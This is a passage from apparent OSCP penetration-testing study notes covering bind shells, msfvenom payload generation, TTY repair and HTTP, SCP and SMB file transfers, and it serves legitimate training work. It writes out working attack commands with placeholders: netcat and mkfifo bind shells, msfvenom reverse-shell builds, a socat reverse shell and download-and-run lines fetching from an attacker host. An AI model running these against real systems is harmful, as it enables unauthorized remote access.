+<pre><code class="language-cmd">powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE
+</code></pre>
+<h3 id="7-worked-example--hypothetical-2">7. Worked example — hypothetical</h3>
+<p>Observation: a PowerShell command can execute but RDP rights are absent. Test: select a supported command channel and verify its identity. Illustrative output: commands run as the web service account. Interpretation: enumerate that token rather than assume an interactive administrator session.</p>
+<h3 id="8-verify-the-result-2">8. Verify the result</h3>
+<p>Verify hostname, whoami /all and command behavior through the resulting channel.</p>
+<h3 id="9-failure-and-fallback-2">9. Failure and fallback</h3>
+<p>A saved credential may be valid for one protocol only. PowerShell policy, language mode, parser and antimalware evidence require different responses.</p>
+<h3 id="10-next-transitions-2">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>; <a href="/oscp/notes/methods/lateral-movement/#move-winrm">Use WinRM, WinRS or PowerShell remoting</a>; <a href="/oscp/notes/methods/execution/#execution-powershell">Distinguish PowerShell policy, language mode and protected execution layers</a>.</p>
+<p><a id="session-bind"></a></p>
+<h2 id="use-a-bind-shell-when-the-target-can-accept-inbound-connections">Use a bind shell when the target can accept inbound connections</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#bind-shells">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-3">1. Purpose and result</h3>
+<p>A verified inbound command channel on the target.</p>
+<h3 id="2-recognition-clues-3">2. Recognition clues</h3>
+<p>Reverse egress is unavailable but a target listener is reachable.</p>
+<h4 id="find-the-clue-from-your-starting-access-3">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect target-side listening permissions, tool implementation and the assessment-source route to a proposed listener.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">nc -h
+ss -lnt
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Netcat help: no -e option
+Selected listen port: not currently bound
+</code></pre>
+<p><strong>Recognize this detail:</strong> The implementation cannot use an assumed -e shell; another supported listener mechanism is needed.</p>
+<p><strong>Still missing before method selection:</strong> Confirm a compatible bind command, permitted listener and inbound source-to-target reachability.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The selected implementation binds and the source reaches it: use the verified inbound channel.</td></tr><tr><td>Ruled out in this context</td><td>The required inbound connection is filtered and no permitted forward exists: reject this bind route.</td></tr><tr><td>Inconclusive</td><td>A local listen socket alone leaves remote firewall/access unknown.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-3">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> Permission to bind, compatible Netcat/Ncat behavior and source-to-target listener connectivity through any required forward.</p>
+<h3 id="4-discover-and-verify-prerequisites-3">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">nc -h
+ss -lnt
+</code></pre>
+<h3 id="5-why-it-works-3">5. Why it works</h3>
+<p>The target listens and the assessment client connects. A local successful bind is separate from remote firewall/route acceptance.</p>
+<h3 id="6-execute-and-choose-variants-3">6. Execute and choose variants</h3>
+<p>Use a bind shell only when Kali can reach a target listener and reverse egress is unavailable.</p>
+<p>Traditional Netcat with <code>-e</code> support on a Linux target:</p>
+<pre><code class="language-bash">nc -lvnp PORT -e /bin/sh
+</code></pre>
+<p>Connect from Kali:</p>
+<pre><code class="language-bash">nc -nv TARGET PORT
+</code></pre>
+<p>FIFO alternative when <code>-e</code> is absent:</p>
+<pre><code class="language-bash">rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&#x26;1 | nc -lvnp PORT >/tmp/f
+</code></pre>
+<p>Ncat target listener:</p>
+<pre><code class="language-bash">ncat -4 -lvn 0.0.0.0 PORT --exec /bin/sh
+</code></pre>
+<blockquote>
+<p>Bind shells expose a target port and may be blocked by the host firewall or upstream ACL. A successful local bind does not prove Kali can reach it.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-3">7. Worked example — hypothetical</h3>
+<p>Observation: the target cannot connect outward. Test: verify an allowed inbound path and compatible bind implementation. Illustrative output: the assessment client connects and receives target identity. Interpretation: use the same verification and terminal-repair steps as another foothold.</p>
+<h3 id="8-verify-the-result-3">8. Verify the result</h3>
+<p>Verify reachable listener plus hostname/id over the channel; record and later remove the created listener.</p>
+<h3 id="9-failure-and-fallback-3">9. Failure and fallback</h3>
+<p>A target-side listener with client timeout implies a route/firewall boundary. Use an appropriate forward or another allowed access form.</p>
+<h3 id="10-next-transitions-3">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/sessions-transfers/#session-tty">Repair a limited Linux terminal</a>; <a href="/oscp/notes/methods/pivoting/#fixed-forward">Relay a single TCP service through a fixed forward</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<p><a id="payload-generate"></a></p>
+<h2 id="generate-a-payload-matching-os-process-format-and-handler">Generate a payload matching OS, process, format and handler</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#generate-payloads-after-selecting-context">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-4">1. Purpose and result</h3>
+<p>A compatible artifact and a correctly paired listener configuration.</p>
+<h3 id="2-recognition-clues-4">2. Recognition clues</h3>
+<p>An existing exploit/delivery primitive needs a binary or raw payload.</p>
+<h4 id="find-the-clue-from-your-starting-access-4">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect the actual consumer/process and existing exploit constraints before browsing payload names or formats.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">file TARGET_ARTIFACT
+msfvenom -l payloads
+msfvenom --list formats
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Consumer: Windows x64 executable
+Candidate payload: windows/x64/shell/reverse_tcp
+Delivery expects: PE executable
+</code></pre>
+<p><strong>Recognize this detail:</strong> The staged payload name and executable consumer must be matched to the handler and delivery format.</p>
+<p><strong>Still missing before method selection:</strong> Check target/process architecture, permitted feature, exact payload options, stage route and listener.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>Format/architecture/handler and routes all match: generate the selected artifact.</td></tr><tr><td>Ruled out in this context</td><td>An ELF or DLL is supplied to an EXE-only consumer: reject that format.</td></tr><tr><td>Inconclusive</td><td>OS architecture without process/delivery evidence does not settle payload compatibility.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-4">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> Verified target/process architecture, delivery format, callback route, payload constraints and a matching staged/stageless listener.</p>
+<h3 id="4-discover-and-verify-prerequisites-4">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">msfvenom -l payloads
+msfvenom --list formats
+msfvenom -p PAYLOAD_NAME --list-options
+</code></pre>
+<h3 id="5-why-it-works-4">5. Why it works</h3>
+<p>An ELF, PE, script and raw shellcode serve different consumers. A staged payload requires another transfer and a matching handler; Netcat may receive a stage request without producing a shell.</p>
+<h3 id="6-execute-and-choose-variants-4">6. Execute and choose variants</h3>
+<p>List rather than guess names and formats:</p>
+<pre><code class="language-bash">msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
+msfvenom --list formats
+msfvenom -p PAYLOAD_NAME --list-options
+</code></pre>
+<p>Stageless command-shell binaries:</p>
+<pre><code class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=LHOST LPORT=LPORT \
+  -f elf -o shell.elf
+
+msfvenom -p windows/x64/shell_reverse_tcp \
+  LHOST=LHOST LPORT=LPORT \
+  -f exe -o shell.exe
+</code></pre>
+<p>Verify the resulting artifacts:</p>
+<pre><code class="language-bash">file shell.elf shell.exe
+sha256sum shell.elf shell.exe
+</code></pre>
+<blockquote>
+<p><code>msfvenom</code> does not make a payload compatible with the delivery path. Match target OS, process architecture, payload type, output format, available execution method and callback route.</p>
+</blockquote>
+<h5 id="staged-versus-stageless">Staged versus stageless</h5>
+<pre><code class="language-text">stageless: complete payload delivered at once; larger, usually simpler and more stable
+staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer
+</code></pre>
+<p>Metasploit naming commonly reflects the distinction:</p>
+<pre><code class="language-text">windows/x64/shell_reverse_tcp   stageless
+windows/x64/shell/reverse_tcp   staged
+</code></pre>
+<p>A raw Netcat listener can receive many ordinary stageless command shells. A staged payload normally needs <code>multi/handler</code> configured with the exact same payload:</p>
+<pre><code class="language-text">msfconsole -q
+use exploit/multi/handler
+set payload PAYLOAD_NAME
+set LHOST LHOST
+set LPORT LPORT
+show options
+run
+</code></pre>
+<blockquote>
+<p>A connection to Netcat with no usable commands can mean a staged payload reached a non-staging listener. It is not necessarily failed code execution.</p>
+</blockquote>
+<h5 id="existing-poc-payload-constraints">Existing-PoC payload constraints</h5>
+<p>Only when an existing reviewed PoC documents payload space and bad characters:</p>
+<pre><code class="language-bash">msfvenom -p PAYLOAD_NAME \
+  LHOST=LHOST LPORT=LPORT \
+  -f FORMAT -v VARIABLE \
+  -b 'BAD_CHARACTERS' \
+  -s MAX_SPACE
+</code></pre>
+<p>Encoders and repeated encoding do not guarantee antimalware evasion. <code>-b</code> is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list.</p>
+<h3 id="7-worked-example--hypothetical-4">7. Worked example — hypothetical</h3>
+<p>Observation: a payload connects to Netcat but produces unreadable/no commands. Test: inspect the exact staged payload name and pair its handler. Illustrative output: staging completes and the intended session appears. Interpretation: verify the identity and record the permitted framework context.</p>
+<h3 id="8-verify-the-result-4">8. Verify the result</h3>
+<p>Check artifact format/hash and actual session identity; generation success is not execution proof.</p>
+<h3 id="9-failure-and-fallback-4">9. Failure and fallback</h3>
+<p>Wrong architecture, stage/handler mismatch, missing second route or payload-space constraints require separate fixes. Encoding does not guarantee endpoint-control bypass.</p>
+<h3 id="10-next-transitions-4">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>; <a href="/oscp/notes/methods/execution/#execution-handler">Pair staged payloads with the correct handler and session lifecycle</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<p><a id="session-tty"></a></p>
+<h2 id="repair-a-limited-linux-terminal">Repair a limited Linux terminal</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#stabilize-a-linux-tty">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-5">1. Purpose and result</h3>
+<p>A usable terminal while preserving the existing identity.</p>
+<h3 id="2-recognition-clues-5">2. Recognition clues</h3>
+<p>A working shell lacks job control, terminal signals or interactive program support.</p>
+<h4 id="find-the-clue-from-your-starting-access-5">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect the working shell's terminal state and available PTY utilities after verifying a stable command channel.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">tty
+command -v python3 script socat
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">not a tty
+/usr/bin/python3
+</code></pre>
+<p><strong>Recognize this detail:</strong> A functioning socket shell lacks a controlling terminal while a potential PTY mechanism exists.</p>
+<p><strong>Still missing before method selection:</strong> Verify the available PTY mode, local terminal handling and stable connection; privilege remains unchanged.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The supported PTY and local settings restore terminal behavior: use interactive tools in that same identity.</td></tr><tr><td>Ruled out in this context</td><td>The channel drops before any command executes: reject terminal settings as the first fault.</td></tr><tr><td>Inconclusive</td><td>No PTY utility found leaves alternative terminal methods/noninteractive use to investigate.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-5">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> A working channel and available PTY mechanism; correct local-terminal control sequence.</p>
+<h3 id="4-discover-and-verify-prerequisites-5">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">tty
+command -v python3 script socat
+</code></pre>
+<h3 id="5-why-it-works-5">5. Why it works</h3>
+<p>A socket-backed command stream is not automatically a terminal. A PTY and correct local raw/echo settings repair terminal behavior without changing privileges.</p>
+<h3 id="6-execute-and-choose-variants-5">6. Execute and choose variants</h3>
+<p>First obtain a PTY with an available interpreter:</p>
+<pre><code class="language-bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre>
+<p>Press <code>Ctrl-Z</code> locally, then:</p>
+<pre><code class="language-bash">stty raw -echo; fg
+</code></pre>
+<p>Back in the remote shell:</p>
+<pre><code class="language-bash">reset
+export TERM=xterm-256color
+stty rows 40 columns 120
+</code></pre>
+<p>If the local terminal becomes unreadable, restore it from a separate/local shell:</p>
+<pre><code class="language-bash">stty sane
+</code></pre>
+<p>Socat can provide a stronger PTY when present on both sides:</p>
+<pre><code class="language-bash"># Kali
+socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr
+
+# Target
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
+</code></pre>
+<blockquote>
+<p>TTY repair changes terminal behavior, not privilege or network reliability. A PTY may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-5">7. Worked example — hypothetical</h3>
+<p>Observation: the shell runs commands but interactive sudo fails. Test: spawn a PTY and repair local terminal settings. Illustrative output: tty reports a device and the prompt behaves correctly. Interpretation: retry the legitimate interactive prerequisite check.</p>
+<h3 id="8-verify-the-result-5">8. Verify the result</h3>
+<p>Check tty, signal handling and an interactive program; confirm the same identity remains.</p>
+<h3 id="9-failure-and-fallback-5">9. Failure and fallback</h3>
+<p>A dropped connection is not solved by terminal settings. If no PTY mechanism exists, use noninteractive commands or an authenticated terminal method.</p>
+<h3 id="10-next-transitions-5">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>; <a href="/oscp/notes/methods/services/#service-ssh">Use SSH passwords, keys and forwarding-capable access</a>.</p>
+<p><a id="transfer-http"></a></p>
+<h2 id="transfer-over-http-using-linux-or-windows-clients">Transfer over HTTP using Linux or Windows clients</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#linux-target-pull-linpeas-from-kali-over-http">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/#verify-the-transfer">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-6">1. Purpose and result</h3>
+<p>A downloaded file whose destination bytes can be verified.</p>
+<h3 id="2-recognition-clues-6">2. Recognition clues</h3>
+<p>A tool/artifact must reach a target that can make an HTTP request.</p>
+<h4 id="find-the-clue-from-your-starting-access-6">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> From the target's command context inspect downloader availability, writable destination and a route to the fixed served directory.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">command -v curl wget
+ls -ld /tmp
+ip route get LHOST
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">/usr/bin/curl
+/tmp: writable to current user
+LHOST via GATEWAY dev INTERFACE
+</code></pre>
+<p><strong>Recognize this detail:</strong> A downloader, destination and plausible outbound path enable an HTTP transfer candidate.</p>
+<p><strong>Still missing before method selection:</strong> Check actual server bind/directory, HTTP request/response and source/destination hashes.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The requested file is retrieved and its bytes match: use the verified copy.</td></tr><tr><td>Ruled out in this context</td><td>No permitted target-to-server route exists: reject this HTTP pull direction.</td></tr><tr><td>Inconclusive</td><td>A route without a logged request leaves bind/firewall/DNS unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-6">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> Correct server bind and served directory; target-to-server route, available downloader and writable destination.</p>
+<h3 id="4-discover-and-verify-prerequisites-6">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">python3 -m http.server 8000 --bind LHOST --directory /PATH/TO/FILES
+</code></pre>
+<h3 id="5-why-it-works-6">5. Why it works</h3>
+<p>The target is the HTTP client even when the assessment host started the operation. A 404 is a server-path problem; no request is a different boundary from successful download with incompatible execution.</p>
+<h3 id="6-execute-and-choose-variants-6">6. Execute and choose variants</h3>
+<p>On Kali, serve the directory containing <code>linpeas.sh</code>:</p>
+<pre><code class="language-bash">cd /path/to/tools
+python3 -m http.server 8000 --bind 0.0.0.0
+</code></pre>
+<p>On the Linux target, download into a writable directory and run it:</p>
+<pre><code class="language-bash">wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh | tee /tmp/linpeas.txt
+</code></pre>
+<blockquote>
+<p><strong>Read:</strong> Kali should log an HTTP request and a successful response. A downloaded enumeration script is a lead generator; manually verify any escalation candidate.</p>
+</blockquote>
+<details>
+<summary><strong>HTTP variants — fixed server directory, curl, Windows and alternate built-ins</strong></summary>
+<h5 id="serve-a-fixed-directory-without-changing-folders">Serve a fixed directory without changing folders</h5>
+<pre><code class="language-bash">python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools
+</code></pre>
+<p>Python's simple server supplies downloads over unencrypted HTTP. Stop it with <code>Ctrl+C</code> when finished.</p>
+<h5 id="linux-target-with-curl">Linux target with curl</h5>
+<pre><code class="language-bash">curl -fL http://LHOST:8000/FILE -o /tmp/FILE
+</code></pre>
+<p><code>-f</code> reports HTTP errors and <code>-L</code> follows redirects. Use a writable destination.</p>
+<h5 id="windows-target-with-powershell">Windows target with PowerShell</h5>
+<p>Run inside PowerShell:</p>
+<pre><code class="language-powershell">Invoke-WebRequest -Uri "http://LHOST:8000/FILE" -OutFile "C:\Windows\Temp\FILE"
+</code></pre>
+<p>From <code>cmd.exe</code>, invoke PowerShell explicitly:</p>
+<pre><code class="language-cmd">powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://LHOST:8000/FILE' -OutFile 'C:\Windows\Temp\FILE'"
+</code></pre>
+<h5 id="windows-alternatives">Windows alternatives</h5>
+<pre><code class="language-powershell">(New-Object Net.WebClient).DownloadFile('http://LHOST:8000/FILE','C:\Windows\Temp\FILE')
+</code></pre>
+<pre><code class="language-cmd">curl.exe -fL http://LHOST:8000/FILE -o C:\Windows\Temp\FILE
+</code></pre>
+<pre><code class="language-cmd">certutil.exe -urlcache -split -f http://LHOST:8000/FILE C:\Windows\Temp\FILE
+</code></pre>
+<p>Availability and policy can differ by host. <code>certutil</code> may leave URL-cache artifacts; remove only artifacts you created when cleanup is appropriate.</p>
+</details>
+<p>Compare the source and destination hashes.</p>
+<p>On Kali or Linux:</p>
+<pre><code class="language-bash">sha256sum FILE
+sha256sum /tmp/FILE
+</code></pre>
+<p>On Windows:</p>
+<pre><code class="language-powershell">Get-FileHash -Algorithm SHA256 "C:\Windows\Temp\FILE"
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> matching SHA-256 values establish that the two saved files contain the same bytes. A successful HTTP status alone does not.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-6">7. Worked example — hypothetical</h3>
+<p>Observation: a download reports success but the tool fails. Test: compare source/destination SHA-256 before execution. Illustrative output: hashes differ and the destination contains an error page. Interpretation: correct the HTTP path and repeat the transfer.</p>
+<h3 id="8-verify-the-result-6">8. Verify the result</h3>
+<p>Compare sha256sum on Linux or Get-FileHash -Algorithm SHA256 on Windows, and verify destination permissions.</p>
+<h3 id="9-failure-and-fallback-6">9. Failure and fallback</h3>
+<p>No request: route/bind/egress. 404: path/name. Matching file but no execution: interpreter/format/control. Diagnose each separately.</p>
+<h3 id="10-next-transitions-6">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-enumerators">Use enumeration tools to generate manually testable candidates</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-enumerators">Turn automated Windows findings into manually verified candidates</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-smb">Move Windows files through an authenticated SMB share</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-stream">Stream a file over a direct TCP connection</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-text">Move a small artifact through a text-only channel</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-ftp">Use a temporary FTP transfer as a constrained fallback</a>.</p>
+<p><a id="transfer-scp"></a></p>
+<h2 id="copy-files-through-an-authenticated-ssh-service">Copy files through an authenticated SSH service</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-7">1. Purpose and result</h3>
+<p>An authenticated file copy with verified bytes.</p>
+<h3 id="2-recognition-clues-7">2. Recognition clues</h3>
+<p>An SSH identity can access the needed source/destination.</p>
+<h4 id="find-the-clue-from-your-starting-access-7">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Use established SSH context to identify allowed file/subsystem access and the intended remote destination's rights.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ssh -v -p PORT USER@TARGET
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Authenticated using publickey
+Session/subsystem policy: inspect before transfer
+</code></pre>
+<p><strong>Recognize this detail:</strong> SSH authentication gives a candidate transport; it does not prove SFTP/subsystem support or destination write.</p>
+<p><strong>Still missing before method selection:</strong> Validate client/server subsystem compatibility, source read and destination write; inspect resulting bytes.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The supported copy mode writes the intended file and hashes match: use SCP.</td></tr><tr><td>Ruled out in this context</td><td>The destination is unwritable: reject that path while retaining SCP to a permitted directory.</td></tr><tr><td>Inconclusive</td><td>Accepted SSH without subsystem evidence leaves transfer behavior unknown.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/services/#service-ssh">Use SSH passwords, keys and forwarding-capable access</a>.</p>
+<h3 id="3-prerequisites-7">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> Reachable SSH/SFTP service, correct key/password and read/write rights; client/server subsystem compatibility.</p>
+<h3 id="4-discover-and-verify-prerequisites-7">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ssh -p PORT -i KEY USER@TARGET
+</code></pre>
+<h3 id="5-why-it-works-7">5. Why it works</h3>
+<p>SCP uses SSH authentication but filesystem rights remain independent. Modern clients may use the SFTP subsystem; a restricted service can allow one access form and deny another.</p>
+<h3 id="6-execute-and-choose-variants-7">6. Execute and choose variants</h3>
+<details>
+<summary><strong>SCP — copy through an authenticated SSH service</strong></summary>
+<h5 id="kali-to-a-linux-target">Kali to a Linux target</h5>
+<pre><code class="language-bash">scp FILE USER@TARGET:/tmp/FILE
+</code></pre>
+<h5 id="linux-target-to-kali">Linux target to Kali</h5>
+<p>Run from Kali when the target's SSH service is reachable:</p>
+<pre><code class="language-bash">scp USER@TARGET:/path/to/FILE ./FILE
+</code></pre>
+<h5 id="ssh-key-or-nonstandard-port">SSH key or nonstandard port</h5>
+<pre><code class="language-bash">scp -i KEY -P PORT FILE USER@TARGET:/tmp/FILE
+</code></pre>
+<p><code>scp</code> uses uppercase <code>-P</code> for the SSH port. Authentication success does not guarantee write permission at the destination path.</p>
+</details>
+<h3 id="7-worked-example--hypothetical-7">7. Worked example — hypothetical</h3>
+<p>Observation: SSH login succeeds but copying into an application directory fails. Test: copy to the user's writable temporary directory. Illustrative output: transfer completes and hashes match. Interpretation: destination authorization caused the original failure.</p>
+<h3 id="8-verify-the-result-7">8. Verify the result</h3>
+<p>Verify copied bytes and location; uppercase -P selects scp's SSH port.</p>
+<h3 id="9-failure-and-fallback-7">9. Failure and fallback</h3>
+<p>Authentication failure, missing subsystem and destination permission failure need different changes. Prefer a supported transfer method over guessing flags.</p>
+<h3 id="10-next-transitions-7">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-http">Transfer over HTTP using Linux or Windows clients</a>; <a href="/oscp/notes/methods/services/#service-ssh">Use SSH passwords, keys and forwarding-capable access</a>.</p>
+<p><a id="transfer-smb"></a></p>
+<h2 id="move-windows-files-through-an-authenticated-smb-share">Move Windows files through an authenticated SMB share</h2>
+<p><strong>Blocks:</strong> 7; transfers support 5–14. <a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">Operational procedure</a> | <a href="/oscp/cheatsheets/shells-payloads/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-8">1. Purpose and result</h3>
+<p>A verified read/write transfer over the temporary share.</p>
+<h3 id="2-recognition-clues-8">2. Recognition clues</h3>
+<p>A Windows source can reach a temporary assessment-side SMB service.</p>
+<h4 id="find-the-clue-from-your-starting-access-8">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> From Windows inspect TCP/445 reachability to the deliberate transfer server and distinguish its share identity from target-domain credentials.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">Test-NetConnection LHOST -Port 445
+net use
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">TcpTestSucceeded : True
+Existing connection: \\LHOST\OTHER_SHARE as OTHER_USER
+</code></pre>
+<p><strong>Recognize this detail:</strong> The service is reachable, but an existing connection can constrain a different credential context.</p>
+<p><strong>Still missing before method selection:</strong> Verify intended share/server credentials, conflicting mappings, read/write rights and destination hash.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The intended authenticated share action succeeds and bytes match: use this transfer route.</td></tr><tr><td>Ruled out in this context</td><td>Outbound SMB is blocked from this source: reject this direction, choosing another transport.</td></tr><tr><td>Inconclusive</td><td>Transport alone does not settle cached-session identity or object rights.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-8">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> Verified command execution or authenticated remote access and a known network path. <strong>Required conditions:</strong> Inbound SMB listener on the server, outbound TCP/445 from the client, compatible SMB version and explicit share credentials.</p>
+<h3 id="4-discover-and-verify-prerequisites-8">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">Test-NetConnection LHOST -Port 445
+</code></pre>
+<h3 id="5-why-it-works-8">5. Why it works</h3>
